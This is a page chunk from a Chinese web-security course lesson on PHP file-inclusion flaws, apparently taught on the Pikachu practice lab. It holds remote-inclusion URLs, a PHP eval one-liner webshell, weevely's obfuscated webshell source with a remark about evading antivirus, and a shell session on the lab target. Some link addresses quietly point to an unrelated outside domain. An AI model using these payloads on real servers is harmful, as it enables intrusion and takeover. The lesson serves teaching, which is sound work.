import{_ as o,j as e,o as t,h as c,k as n,f as s,Q as l,s as a}from"./chunks/framework.d3daa342.js";const x=JSON.parse('{"title":"15文件包含：不受限地引入文件可能导致网站被入侵","description":"","frontmatter":{},"headers":[],"relativePath":"posts/devops/Web 安全攻防之道_文档/(5983) 15  文件包含：不受限地引入文件可能导致网站被入侵.md","filePath":"posts/devops/Web 安全攻防之道_文档/(5983) 15  文件包含：不受限地引入文件可能导致网站被入侵.md","lastUpdated":1696682708000}'),r={name:"posts/devops/Web 安全攻防之道_文档/(5983) 15  文件包含：不受限地引入文件可能导致网站被入侵.md"},y=l(`<h1 id="_15文件包含-不受限地引入文件可能导致网站被入侵" tabindex="-1">15文件包含：不受限地引入文件可能导致网站被入侵 <a class="header-anchor" href="#_15文件包含-不受限地引入文件可能导致网站被入侵" aria-label="Permalink to &quot;15文件包含：不受限地引入文件可能导致网站被入侵&quot;">​</a></h1><p>从这一讲开始，我将会向你介绍 PHP 中常见的&quot;文件包含漏洞&quot;，它可以造成任意代码执行、控制服务器，危害也很大。它本质上如同 XSS 一样，都是代码注入导致的漏洞，只是它们注入代码的语言有所差异。</p><p>很多语言支持使用包含文件，这样允许开发者把可重复使用的代码存入单个文件中，在未来需要使用时，将它包含在其他代码文件中即可使用。</p><p>如果是像 C/C++ 这种编译语言，即使可以包含任意文件，若没有调用其中函数也不会有什么影响；但是像 PHP 这种解析型语言，文件放在服务器上被访问就可能被执行了，PHP 中常用的文件包含函数有：</p><ul><li><p>include()</p></li><li><p>include_once()</p></li><li><p>require()</p></li><li><p>require_once()</p></li></ul><p>当上述函数参数被外部任意控制时，就可以引用包含恶意代码的文件，导致执行恶意代码，这就是漏洞产生的原因。比如如下漏洞代码，由外部的 GET 参数 filename 控制包含的文件路径，就导致文件包含漏洞的产生。</p><div class="language-php vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">php</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#F97583;">&lt;?</span><span style="color:#79B8FF;">php</span></span>
<span class="line"><span style="color:#E1E4E8;">    $filename  </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> $_GET[</span><span style="color:#9ECBFF;">&#39;filename&#39;</span><span style="color:#E1E4E8;">];</span></span>
<span class="line"><span style="color:#E1E4E8;">    </span><span style="color:#F97583;">include</span><span style="color:#E1E4E8;">($filename);</span></span>
<span class="line"><span style="color:#F97583;">?&gt;</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#D73A49;">&lt;?</span><span style="color:#005CC5;">php</span></span>
<span class="line"><span style="color:#24292E;">    $filename  </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> $_GET[</span><span style="color:#032F62;">&#39;filename&#39;</span><span style="color:#24292E;">];</span></span>
<span class="line"><span style="color:#24292E;">    </span><span style="color:#D73A49;">include</span><span style="color:#24292E;">($filename);</span></span>
<span class="line"><span style="color:#D73A49;">?&gt;</span></span></code></pre></div><p>根据所包含的文件位置，可以分为远程文件包含和本地文件包含。</p><h3 id="远程文件包含" tabindex="-1">远程文件包含 <a class="header-anchor" href="#远程文件包含" aria-label="Permalink to &quot;远程文件包含&quot;">​</a></h3><p>若所包含的文件位于远程服务器，那么它就属于远程文件包含，这种情况需要服务端的 php.ini 支持以下配置：</p><ul><li><p>allow_url_fopen = On（允许打开远程文件）</p></li><li><p>allow_url_include = On（允许包含远程文件，在 PHP 5.2 之后默认关闭）</p></li></ul><p>以 Pikachu 靶场中的&quot;File Inclusion(remote)&quot;题目为例，先来看题目界面：</p>`,12),E=l(`<p>图 1 Pikachu File Inclusion(remote)</p><p>关键的漏洞代码如下：</p><div class="language-php vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">php</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#F97583;">if</span><span style="color:#E1E4E8;">(</span><span style="color:#79B8FF;">isset</span><span style="color:#E1E4E8;">($_GET[</span><span style="color:#9ECBFF;">&#39;submit&#39;</span><span style="color:#E1E4E8;">]) </span><span style="color:#F97583;">&amp;&amp;</span><span style="color:#E1E4E8;"> $_GET[</span><span style="color:#9ECBFF;">&#39;filename&#39;</span><span style="color:#E1E4E8;">]</span><span style="color:#F97583;">!=</span><span style="color:#79B8FF;">null</span><span style="color:#E1E4E8;">){</span></span>
<span class="line"><span style="color:#E1E4E8;">	    $filename</span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;">$_GET[</span><span style="color:#9ECBFF;">&#39;filename&#39;</span><span style="color:#E1E4E8;">];</span></span>
<span class="line"><span style="color:#E1E4E8;">	    </span><span style="color:#F97583;">include</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">&quot;</span><span style="color:#E1E4E8;">$filename</span><span style="color:#9ECBFF;">&quot;</span><span style="color:#E1E4E8;">;</span><span style="color:#6A737D;">//变量传进来直接包含,没做任何的安全限制</span></span>
<span class="line"><span style="color:#E1E4E8;">}</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#D73A49;">if</span><span style="color:#24292E;">(</span><span style="color:#005CC5;">isset</span><span style="color:#24292E;">($_GET[</span><span style="color:#032F62;">&#39;submit&#39;</span><span style="color:#24292E;">]) </span><span style="color:#D73A49;">&amp;&amp;</span><span style="color:#24292E;"> $_GET[</span><span style="color:#032F62;">&#39;filename&#39;</span><span style="color:#24292E;">]</span><span style="color:#D73A49;">!=</span><span style="color:#005CC5;">null</span><span style="color:#24292E;">){</span></span>
<span class="line"><span style="color:#24292E;">	    $filename</span><span style="color:#D73A49;">=</span><span style="color:#24292E;">$_GET[</span><span style="color:#032F62;">&#39;filename&#39;</span><span style="color:#24292E;">];</span></span>
<span class="line"><span style="color:#24292E;">	    </span><span style="color:#D73A49;">include</span><span style="color:#24292E;"> </span><span style="color:#032F62;">&quot;</span><span style="color:#24292E;">$filename</span><span style="color:#032F62;">&quot;</span><span style="color:#24292E;">;</span><span style="color:#6A737D;">//变量传进来直接包含,没做任何的安全限制</span></span>
<span class="line"><span style="color:#24292E;">}</span></span></code></pre></div><p>给 GET 参数 filename 传递个远程 PHP 文件地址即可包含进去，造成代码执行。我已经在另一台机器上存放 phpinfo.php 执行 phpinfo() 函数，地址是 <a href="http://www.1491.com.tw/phpinfo.php" target="_blank" rel="noreferrer">http://127.0.0.1/phpinfo.php</a>，phpinfo.php 代码如下：</p><div class="language-php vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">php</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#F97583;">&lt;?</span><span style="color:#79B8FF;">php</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">phpinfo</span><span style="color:#E1E4E8;">(); </span><span style="color:#F97583;">?&gt;</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#D73A49;">&lt;?</span><span style="color:#005CC5;">php</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">phpinfo</span><span style="color:#24292E;">(); </span><span style="color:#D73A49;">?&gt;</span></span></code></pre></div><p>此处我使用 Trmper Chrome 去抓包，然后在题目上的下拉菜单中选一个，点&quot;提交&quot;：</p>`,6),i=l('<p>图 2 用 Tamper Chrome 抓包</p><p>得到 GET 请求地址与参数，可以看出用于包含文件的参数 filename 被设置为 &quot;include/file3.php&quot;：</p><div class="language-java vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">java</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#E1E4E8;">http</span><span style="color:#F97583;">:</span><span style="color:#6A737D;">//127.0.0.1:8080/vul/fileinclude/fi_remote.php?filename=include%2Ffile3.php&amp;submit=%E6%8F%90%E4%BA%A4</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#24292E;">http</span><span style="color:#D73A49;">:</span><span style="color:#6A737D;">//127.0.0.1:8080/vul/fileinclude/fi_remote.php?filename=include%2Ffile3.php&amp;submit=%E6%8F%90%E4%BA%A4</span></span></code></pre></div><p>修改 filename 参数为<a href="http://www.1491.com.tw/phpinfo.php" target="_blank" rel="noreferrer">http:/127.0.0.1/phpinfo.php</a>，该 phpinfo.php 就执行 phpinfo() 函数，访问如下 URL：</p><div class="language-java vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">java</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#E1E4E8;">http</span><span style="color:#F97583;">:</span><span style="color:#6A737D;">//127.0.0.1:8080/vul/fileinclude/fi_remote.php?filename=http://127.0.0.1/phpinfo.php&amp;submit=%E6%8F%90%E4%BA%A4</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#24292E;">http</span><span style="color:#D73A49;">:</span><span style="color:#6A737D;">//127.0.0.1:8080/vul/fileinclude/fi_remote.php?filename=http://127.0.0.1/phpinfo.php&amp;submit=%E6%8F%90%E4%BA%A4</span></span></code></pre></div><p>phpinfo 执行成功了：</p>',6),h=l(`<p>图 3 远程文件包含执行 phpinfo</p><p>接入来利用就简单了，我们直接远程包含一个创建一句话木马的 txt 文件，不用 PHP 后缀是为了避免在自己服务器被执行。</p><p>为了演示，我在 <a href="http://127.0.0.1/shell.txth" target="_blank" rel="noreferrer">http://127.0.0.1/shell.txt</a> 创建文件（如果你没有自己的服务器，去 github 上存储一个木马文件也是可行的），写入如下代码，用于生成一句话木马：</p><div class="language-php vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">php</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#F97583;">&lt;?</span><span style="color:#79B8FF;">php</span></span>
<span class="line"><span style="color:#E1E4E8;">  $a </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">&quot;&lt;?php eval(</span><span style="color:#79B8FF;">\\$</span><span style="color:#9ECBFF;">_POST[&#39;Cknife&#39;])?&gt;&quot;</span><span style="color:#E1E4E8;">;</span></span>
<span class="line"><span style="color:#E1E4E8;">  </span><span style="color:#79B8FF;">file_put_contents</span><span style="color:#E1E4E8;">(</span><span style="color:#9ECBFF;">&quot;a.php&quot;</span><span style="color:#E1E4E8;">,$a);</span></span>
<span class="line"><span style="color:#F97583;">?&gt;</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#D73A49;">&lt;?</span><span style="color:#005CC5;">php</span></span>
<span class="line"><span style="color:#24292E;">  $a </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> </span><span style="color:#032F62;">&quot;&lt;?php eval(</span><span style="color:#005CC5;">\\$</span><span style="color:#032F62;">_POST[&#39;Cknife&#39;])?&gt;&quot;</span><span style="color:#24292E;">;</span></span>
<span class="line"><span style="color:#24292E;">  </span><span style="color:#005CC5;">file_put_contents</span><span style="color:#24292E;">(</span><span style="color:#032F62;">&quot;a.php&quot;</span><span style="color:#24292E;">,$a);</span></span>
<span class="line"><span style="color:#D73A49;">?&gt;</span></span></code></pre></div><p>然后访问如下 URL 就会在服务端生成一句话木马文件 a.php：</p><div class="language-java vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">java</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#E1E4E8;">http</span><span style="color:#F97583;">:</span><span style="color:#6A737D;">//127.0.0.1:8080/vul/fileinclude/fi_remote.php?filename=http://127.0.0.1/shell.txt&amp;submit=%E6%8F%90%E4%BA%A4</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#24292E;">http</span><span style="color:#D73A49;">:</span><span style="color:#6A737D;">//127.0.0.1:8080/vul/fileinclude/fi_remote.php?filename=http://127.0.0.1/shell.txt&amp;submit=%E6%8F%90%E4%BA%A4</span></span></code></pre></div><p>成功生成一句话木马文件 a.php：</p><div class="language-java vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">java</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#E1E4E8;">sudo docker exec </span><span style="color:#F97583;">-</span><span style="color:#E1E4E8;">it 7286434c6e88 </span><span style="color:#F97583;">/</span><span style="color:#E1E4E8;">bin</span><span style="color:#F97583;">/</span><span style="color:#E1E4E8;">bash</span></span>
<span class="line"><span style="color:#E1E4E8;">root@</span><span style="color:#F97583;">7286434c6e88:/</span><span style="color:#E1E4E8;"># cat </span><span style="color:#F97583;">/</span><span style="color:#E1E4E8;">var</span><span style="color:#F97583;">/</span><span style="color:#E1E4E8;">www</span><span style="color:#F97583;">/</span><span style="color:#E1E4E8;">html</span><span style="color:#F97583;">/</span><span style="color:#E1E4E8;">a.php</span></span>
<span class="line"><span style="color:#F97583;">&lt;?</span><span style="color:#E1E4E8;">php </span><span style="color:#B392F0;">eval</span><span style="color:#E1E4E8;">($</span><span style="color:#F97583;">_POST</span><span style="color:#E1E4E8;">[</span><span style="color:#9ECBFF;">&#39;Cknife&#39;</span><span style="color:#E1E4E8;">])</span><span style="color:#F97583;">?&gt;</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#24292E;">sudo docker exec </span><span style="color:#D73A49;">-</span><span style="color:#24292E;">it 7286434c6e88 </span><span style="color:#D73A49;">/</span><span style="color:#24292E;">bin</span><span style="color:#D73A49;">/</span><span style="color:#24292E;">bash</span></span>
<span class="line"><span style="color:#24292E;">root@</span><span style="color:#D73A49;">7286434c6e88:/</span><span style="color:#24292E;"># cat </span><span style="color:#D73A49;">/</span><span style="color:#24292E;">var</span><span style="color:#D73A49;">/</span><span style="color:#24292E;">www</span><span style="color:#D73A49;">/</span><span style="color:#24292E;">html</span><span style="color:#D73A49;">/</span><span style="color:#24292E;">a.php</span></span>
<span class="line"><span style="color:#D73A49;">&lt;?</span><span style="color:#24292E;">php </span><span style="color:#6F42C1;">eval</span><span style="color:#24292E;">($</span><span style="color:#D73A49;">_POST</span><span style="color:#24292E;">[</span><span style="color:#032F62;">&#39;Cknife&#39;</span><span style="color:#24292E;">])</span><span style="color:#D73A49;">?&gt;</span></span></code></pre></div><p>与《13 | 文件上传漏洞：种植服务器木马的捷径》中关于文件上传漏洞利用的方法一样，你可以用 Cknife、菜刀、冰蝎等客户端工具去连接一句话木马，就可以直接控制服务器了，此处不再赘述。</p><p>前面介绍的一句话木马比较容易被检测到，个人喜欢使用 <a href="https://github.com/epinna/weevely3" target="_blank" rel="noreferrer">weevely3</a>，因为它支持变形的一句话木马：</p><div class="language-java vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">java</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#E1E4E8;">$ python3 weevely.py</span></span>
<span class="line"><span style="color:#E1E4E8;">[</span><span style="color:#F97583;">+</span><span style="color:#E1E4E8;">] weevely </span><span style="color:#79B8FF;">4.0</span><span style="color:#E1E4E8;">.</span><span style="color:#FDAEB7;font-style:italic;">1</span></span>
<span class="line"><span style="color:#E1E4E8;">[</span><span style="color:#F97583;">!</span><span style="color:#E1E4E8;">] Error</span><span style="color:#F97583;">:</span><span style="color:#E1E4E8;"> the following arguments are required</span><span style="color:#F97583;">:</span><span style="color:#E1E4E8;"> path</span></span>
<span class="line"><span style="color:#E1E4E8;">[</span><span style="color:#F97583;">+</span><span style="color:#E1E4E8;">] Run terminal or command on the target</span></span>
<span class="line"><span style="color:#E1E4E8;">    weevely </span><span style="color:#F97583;">&lt;</span><span style="color:#E1E4E8;">URL</span><span style="color:#F97583;">&gt;</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">&lt;</span><span style="color:#E1E4E8;">password</span><span style="color:#F97583;">&gt;</span><span style="color:#E1E4E8;"> [cmd]</span></span>
<span class="line"><span style="color:#E1E4E8;">[</span><span style="color:#F97583;">+</span><span style="color:#E1E4E8;">] Recover an existing session</span></span>
<span class="line"><span style="color:#E1E4E8;">    weevely session </span><span style="color:#F97583;">&lt;</span><span style="color:#E1E4E8;">path</span><span style="color:#F97583;">&gt;</span><span style="color:#E1E4E8;"> [cmd]</span></span>
<span class="line"><span style="color:#E1E4E8;">[</span><span style="color:#F97583;">+</span><span style="color:#E1E4E8;">] Generate </span><span style="color:#F97583;">new</span><span style="color:#E1E4E8;"> agent</span></span>
<span class="line"><span style="color:#E1E4E8;">    weevely generate &lt;</span><span style="color:#F97583;">password</span><span style="color:#E1E4E8;">&gt; &lt;</span><span style="color:#F97583;">path</span><span style="color:#E1E4E8;">&gt;</span></span>
<span class="line"><span style="color:#E1E4E8;">$ python3 weevely.py generate </span><span style="color:#9ECBFF;">&#39;test&#39;</span><span style="color:#E1E4E8;"> .</span><span style="color:#F97583;">/</span><span style="color:#E1E4E8;">shell.php</span></span>
<span class="line"><span style="color:#E1E4E8;">Generated </span><span style="color:#9ECBFF;">&#39;./shell.php&#39;</span><span style="color:#E1E4E8;"> with password </span><span style="color:#9ECBFF;">&#39;test&#39;</span><span style="color:#E1E4E8;"> of </span><span style="color:#79B8FF;">761</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">byte</span><span style="color:#E1E4E8;"> size.</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#24292E;">$ python3 weevely.py</span></span>
<span class="line"><span style="color:#24292E;">[</span><span style="color:#D73A49;">+</span><span style="color:#24292E;">] weevely </span><span style="color:#005CC5;">4.0</span><span style="color:#24292E;">.</span><span style="color:#B31D28;font-style:italic;">1</span></span>
<span class="line"><span style="color:#24292E;">[</span><span style="color:#D73A49;">!</span><span style="color:#24292E;">] Error</span><span style="color:#D73A49;">:</span><span style="color:#24292E;"> the following arguments are required</span><span style="color:#D73A49;">:</span><span style="color:#24292E;"> path</span></span>
<span class="line"><span style="color:#24292E;">[</span><span style="color:#D73A49;">+</span><span style="color:#24292E;">] Run terminal or command on the target</span></span>
<span class="line"><span style="color:#24292E;">    weevely </span><span style="color:#D73A49;">&lt;</span><span style="color:#24292E;">URL</span><span style="color:#D73A49;">&gt;</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">&lt;</span><span style="color:#24292E;">password</span><span style="color:#D73A49;">&gt;</span><span style="color:#24292E;"> [cmd]</span></span>
<span class="line"><span style="color:#24292E;">[</span><span style="color:#D73A49;">+</span><span style="color:#24292E;">] Recover an existing session</span></span>
<span class="line"><span style="color:#24292E;">    weevely session </span><span style="color:#D73A49;">&lt;</span><span style="color:#24292E;">path</span><span style="color:#D73A49;">&gt;</span><span style="color:#24292E;"> [cmd]</span></span>
<span class="line"><span style="color:#24292E;">[</span><span style="color:#D73A49;">+</span><span style="color:#24292E;">] Generate </span><span style="color:#D73A49;">new</span><span style="color:#24292E;"> agent</span></span>
<span class="line"><span style="color:#24292E;">    weevely generate &lt;</span><span style="color:#D73A49;">password</span><span style="color:#24292E;">&gt; &lt;</span><span style="color:#D73A49;">path</span><span style="color:#24292E;">&gt;</span></span>
<span class="line"><span style="color:#24292E;">$ python3 weevely.py generate </span><span style="color:#032F62;">&#39;test&#39;</span><span style="color:#24292E;"> .</span><span style="color:#D73A49;">/</span><span style="color:#24292E;">shell.php</span></span>
<span class="line"><span style="color:#24292E;">Generated </span><span style="color:#032F62;">&#39;./shell.php&#39;</span><span style="color:#24292E;"> with password </span><span style="color:#032F62;">&#39;test&#39;</span><span style="color:#24292E;"> of </span><span style="color:#005CC5;">761</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">byte</span><span style="color:#24292E;"> size.</span></span></code></pre></div><p>看下生成的 shell.php 代码，可以看到其内容都是经过混淆的，肉眼是很难直接看懂的，有助于逃过一些木马的查杀。</p><div class="language-php vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">php</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#E1E4E8;">$ </span><span style="color:#79B8FF;">cat</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">shell</span><span style="color:#F97583;">.</span><span style="color:#79B8FF;">php</span></span>
<span class="line"><span style="color:#F97583;">&lt;?</span><span style="color:#79B8FF;">php</span></span>
<span class="line"><span style="color:#E1E4E8;">$S</span><span style="color:#F97583;">=</span><span style="color:#9ECBFF;">&#39;!(&quot;/$^!kh(.+^!)^!$kf/&quot;,@file^!_g^!et_content^!s(&quot;p^!hp^!://input&quot;),$m^!)=^!=1) {@ob_star^!t^!();@ev&#39;</span><span style="color:#E1E4E8;">;</span></span>
<span class="line"><span style="color:#E1E4E8;">$p</span><span style="color:#F97583;">=</span><span style="color:#9ECBFF;">&#39;$^!k^!=&quot;098f6bcd&quot;;$kh=&quot;4^!62^!1d373c^!ad^!e&quot;;$kf^!=&quot;4e832627b^!4f6&quot;;$p=&quot;q^!BSPYX^!xS^!wBm8fbHZ&quot;;f^!u&#39;</span><span style="color:#E1E4E8;">;</span></span>
<span class="line"><span style="color:#E1E4E8;">$x</span><span style="color:#F97583;">=</span><span style="color:#9ECBFF;">&#39;=0;($^!j&lt;$c&amp;&amp;$i&lt;$^!l);$j++^!,$i^!++){$^!o.=$t{^!$i^!}^$k{^!$^!j};}}return $o;}if^! (^!@preg_match^&#39;</span><span style="color:#E1E4E8;">;</span></span>
<span class="line"><span style="color:#E1E4E8;">$Y</span><span style="color:#F97583;">=</span><span style="color:#9ECBFF;">&#39;^!al(^!@gzunc^!omp^!res^!s(@x(@base^!64_d^!ecode($m[^!1]),$k)));$^!o=@o^!b_get_conte^!nts()^!;@ob_e&#39;</span><span style="color:#E1E4E8;">;</span></span>
<span class="line"><span style="color:#E1E4E8;">$k</span><span style="color:#F97583;">=</span><span style="color:#79B8FF;">str_replace</span><span style="color:#E1E4E8;">(</span><span style="color:#9ECBFF;">&#39;ha&#39;</span><span style="color:#E1E4E8;">,</span><span style="color:#9ECBFF;">&#39;&#39;</span><span style="color:#E1E4E8;">,</span><span style="color:#9ECBFF;">&#39;hacreathae_hafhaunhahaction&#39;</span><span style="color:#E1E4E8;">);</span></span>
<span class="line"><span style="color:#E1E4E8;">$m</span><span style="color:#F97583;">=</span><span style="color:#9ECBFF;">&#39;nc^!tio^!n x($t^!,$k^!)^!{$c=strlen($k)^!;$l=strlen(^!$t);$o=^!&quot;&quot;;f^!^!or($i=^!0;$^!i&lt;$l;^!){for($j&#39;</span><span style="color:#E1E4E8;">;</span></span>
<span class="line"><span style="color:#E1E4E8;">$h</span><span style="color:#F97583;">=</span><span style="color:#9ECBFF;">&#39;^!n^!d_clean();^!$^!r=@ba^!s^!e64^!_encode(@x(@gzcompre^!ss^!($o),^!$k));prin^!^!t(&quot;$p$kh$r$kf&quot;);}&#39;</span><span style="color:#E1E4E8;">;</span></span>
<span class="line"><span style="color:#E1E4E8;">$E</span><span style="color:#F97583;">=</span><span style="color:#79B8FF;">str_replace</span><span style="color:#E1E4E8;">(</span><span style="color:#9ECBFF;">&#39;^!&#39;</span><span style="color:#E1E4E8;">,</span><span style="color:#9ECBFF;">&#39;&#39;</span><span style="color:#E1E4E8;">,$p</span><span style="color:#F97583;">.</span><span style="color:#E1E4E8;">$m</span><span style="color:#F97583;">.</span><span style="color:#E1E4E8;">$x</span><span style="color:#F97583;">.</span><span style="color:#E1E4E8;">$S</span><span style="color:#F97583;">.</span><span style="color:#E1E4E8;">$Y</span><span style="color:#F97583;">.</span><span style="color:#E1E4E8;">$h);</span></span>
<span class="line"><span style="color:#E1E4E8;">$o</span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;">$k(</span><span style="color:#9ECBFF;">&#39;&#39;</span><span style="color:#E1E4E8;">,$E);$o();</span></span>
<span class="line"><span style="color:#F97583;">?&gt;</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#24292E;">$ </span><span style="color:#005CC5;">cat</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">shell</span><span style="color:#D73A49;">.</span><span style="color:#005CC5;">php</span></span>
<span class="line"><span style="color:#D73A49;">&lt;?</span><span style="color:#005CC5;">php</span></span>
<span class="line"><span style="color:#24292E;">$S</span><span style="color:#D73A49;">=</span><span style="color:#032F62;">&#39;!(&quot;/$^!kh(.+^!)^!$kf/&quot;,@file^!_g^!et_content^!s(&quot;p^!hp^!://input&quot;),$m^!)=^!=1) {@ob_star^!t^!();@ev&#39;</span><span style="color:#24292E;">;</span></span>
<span class="line"><span style="color:#24292E;">$p</span><span style="color:#D73A49;">=</span><span style="color:#032F62;">&#39;$^!k^!=&quot;098f6bcd&quot;;$kh=&quot;4^!62^!1d373c^!ad^!e&quot;;$kf^!=&quot;4e832627b^!4f6&quot;;$p=&quot;q^!BSPYX^!xS^!wBm8fbHZ&quot;;f^!u&#39;</span><span style="color:#24292E;">;</span></span>
<span class="line"><span style="color:#24292E;">$x</span><span style="color:#D73A49;">=</span><span style="color:#032F62;">&#39;=0;($^!j&lt;$c&amp;&amp;$i&lt;$^!l);$j++^!,$i^!++){$^!o.=$t{^!$i^!}^$k{^!$^!j};}}return $o;}if^! (^!@preg_match^&#39;</span><span style="color:#24292E;">;</span></span>
<span class="line"><span style="color:#24292E;">$Y</span><span style="color:#D73A49;">=</span><span style="color:#032F62;">&#39;^!al(^!@gzunc^!omp^!res^!s(@x(@base^!64_d^!ecode($m[^!1]),$k)));$^!o=@o^!b_get_conte^!nts()^!;@ob_e&#39;</span><span style="color:#24292E;">;</span></span>
<span class="line"><span style="color:#24292E;">$k</span><span style="color:#D73A49;">=</span><span style="color:#005CC5;">str_replace</span><span style="color:#24292E;">(</span><span style="color:#032F62;">&#39;ha&#39;</span><span style="color:#24292E;">,</span><span style="color:#032F62;">&#39;&#39;</span><span style="color:#24292E;">,</span><span style="color:#032F62;">&#39;hacreathae_hafhaunhahaction&#39;</span><span style="color:#24292E;">);</span></span>
<span class="line"><span style="color:#24292E;">$m</span><span style="color:#D73A49;">=</span><span style="color:#032F62;">&#39;nc^!tio^!n x($t^!,$k^!)^!{$c=strlen($k)^!;$l=strlen(^!$t);$o=^!&quot;&quot;;f^!^!or($i=^!0;$^!i&lt;$l;^!){for($j&#39;</span><span style="color:#24292E;">;</span></span>
<span class="line"><span style="color:#24292E;">$h</span><span style="color:#D73A49;">=</span><span style="color:#032F62;">&#39;^!n^!d_clean();^!$^!r=@ba^!s^!e64^!_encode(@x(@gzcompre^!ss^!($o),^!$k));prin^!^!t(&quot;$p$kh$r$kf&quot;);}&#39;</span><span style="color:#24292E;">;</span></span>
<span class="line"><span style="color:#24292E;">$E</span><span style="color:#D73A49;">=</span><span style="color:#005CC5;">str_replace</span><span style="color:#24292E;">(</span><span style="color:#032F62;">&#39;^!&#39;</span><span style="color:#24292E;">,</span><span style="color:#032F62;">&#39;&#39;</span><span style="color:#24292E;">,$p</span><span style="color:#D73A49;">.</span><span style="color:#24292E;">$m</span><span style="color:#D73A49;">.</span><span style="color:#24292E;">$x</span><span style="color:#D73A49;">.</span><span style="color:#24292E;">$S</span><span style="color:#D73A49;">.</span><span style="color:#24292E;">$Y</span><span style="color:#D73A49;">.</span><span style="color:#24292E;">$h);</span></span>
<span class="line"><span style="color:#24292E;">$o</span><span style="color:#D73A49;">=</span><span style="color:#24292E;">$k(</span><span style="color:#032F62;">&#39;&#39;</span><span style="color:#24292E;">,$E);$o();</span></span>
<span class="line"><span style="color:#D73A49;">?&gt;</span></span></code></pre></div><p>但是工具一旦出名后，就容易被查杀，需要自己去做一些去特征化的免杀的处理，这不在本课程的讨论范围，有兴趣的话，你可以网上搜索关于木马免杀的文章。</p><p>之后 weevely.py 客户端直接连接就可以获得服务器的 shell 权限。</p><div class="language-shell vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">shell</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#B392F0;">$</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">python3</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">weevely.py</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">http://127.0.0.1:8080/shell.php</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">test</span></span>
<span class="line"><span style="color:#E1E4E8;">[+] weevely 4.0.1</span></span>
<span class="line"><span style="color:#E1E4E8;">[+] Target:	www-data@7286434c6e88:/app</span></span>
<span class="line"><span style="color:#E1E4E8;">[+] Session:	/home/admin/.weevely/sessions/127.0.0.1/shell_1.session</span></span>
<span class="line"><span style="color:#E1E4E8;">[+] Shell:	System shell</span></span>
<span class="line"><span style="color:#E1E4E8;">[+] Browse the filesystem or execute commands starts the connection</span></span>
<span class="line"><span style="color:#E1E4E8;">[+] to the target. Type :help </span><span style="color:#F97583;">for</span><span style="color:#E1E4E8;"> more information.</span></span>
<span class="line"><span style="color:#B392F0;">weevely&gt;</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">ls</span></span>
<span class="line"><span style="color:#B392F0;">a.php</span></span>
<span class="line"><span style="color:#B392F0;">assets</span></span>
<span class="line"><span style="color:#B392F0;">Dockerfile</span></span>
<span class="line"><span style="color:#B392F0;">footer.php</span></span>
<span class="line"><span style="color:#B392F0;">header.php</span></span>
<span class="line"><span style="color:#B392F0;">inc</span></span>
<span class="line"><span style="color:#B392F0;">index.php</span></span>
<span class="line"><span style="color:#B392F0;">install.php</span></span>
<span class="line"><span style="color:#B392F0;">LICENSE</span></span>
<span class="line"><span style="color:#B392F0;">pkxss</span></span>
<span class="line"><span style="color:#B392F0;">README.md</span></span>
<span class="line"><span style="color:#B392F0;">shell.php</span></span>
<span class="line"><span style="color:#B392F0;">shell.txt</span></span>
<span class="line"><span style="color:#79B8FF;">test</span></span>
<span class="line"><span style="color:#B392F0;">vul</span></span>
<span class="line"><span style="color:#B392F0;">wiki</span></span>
<span class="line"><span style="color:#B392F0;">www-data@7286434c6e88:/app</span><span style="color:#E1E4E8;"> $ </span><span style="color:#9ECBFF;">id</span></span>
